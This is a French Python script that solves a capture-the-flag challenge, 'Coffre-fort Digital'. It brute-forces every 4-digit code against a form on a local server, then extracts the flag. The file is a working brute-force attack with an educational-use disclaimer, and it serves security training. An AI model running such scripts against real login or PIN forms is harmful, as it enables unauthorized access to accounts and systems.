#!/usr/bin/env python3
"""
Script de bruteforce pour le challenge Coffre-fort Digital
Ce script teste automatiquement tous les codes de 0000 à 9999

ATTENTION : Ce script est fourni à des fins éducatives uniquement.
N'utilisez jamais ce type de technique sur des systèmes sans autorisation.
"""

import requests
import time

# Configuration
URL = "http://localhost:5004"
START_CODE = 0
END_CODE = 9999

def bruteforce_vault():
    """
    Fonction principale de bruteforce
    Teste tous les codes possibles jusqu'à trouver le bon
    """
    print("🔨 Début de l'attaque par force brute...")
    print(f"📊 Codes à tester : {END_CODE - START_CODE + 1}")
    print("-" * 50)
    
    start_time = time.time()
    
    for code in range(START_CODE, END_CODE + 1):
        # Formater le code avec des zéros (ex: 7 → "0007")
        code_str = str(code).zfill(4)
        
        # Préparer les données du formulaire
        data = {'code': code_str}
        
        try:
            # Envoyer la requête POST
            response = requests.post(URL, data=data)
            
            # Vérifier si on a trouvé le bon code
            if 'CTF{' in response.text or 'déverrouillé' in response.text:
                elapsed = time.time() - start_time
                print(f"\n✅ CODE TROUVÉ : {code_str}")
                print(f"⏱️  Temps écoulé : {elapsed:.2f} secondes")
                print(f"📈 Tentatives effectuées : {code + 1}")
                
                # Extraire le flag de la réponse
                if 'CTF{' in response.text:
                    start = response.text.find('CTF{')
                    end = response.text.find('}', start) + 1
                    flag = response.text[start:end]
                    print(f"🎉 FLAG : {flag}")
                
                return code_str
            
            # Afficher la progression tous les 100 essais
            if (code + 1) % 100 == 0:
                elapsed = time.time() - start_time
                progress = ((code + 1) / (END_CODE + 1)) * 100
                rate = (code + 1) / elapsed if elapsed > 0 else 0
                print(f"⏳ Progression : {code + 1}/{END_CODE + 1} ({progress:.1f}%) - {rate:.0f} essais/s")
        
        except requests.exceptions.RequestException as e:
            print(f"❌ Erreur de connexion : {e}")
            print("Assurez-vous que le serveur est lancé sur http://localhost:5004")
            return None
        
        # Petit délai pour ne pas surcharger le serveur (optionnel)
        # time.sleep(0.01)
    
    print("\n❌ Code non trouvé dans la plage testée")
    return None

if __name__ == "__main__":
    print("=" * 50)
    print("  BRUTEFORCE CHALLENGE - COFFRE-FORT DIGITAL")
    print("=" * 50)
    print()
    
    result = bruteforce_vault()
    
    if result:
        print("\n🎓 Challenge réussi ! Soumettez le flag sur la plateforme.")
    else:
        print("\n⚠️  Challenge non résolu. Vérifiez la configuration.")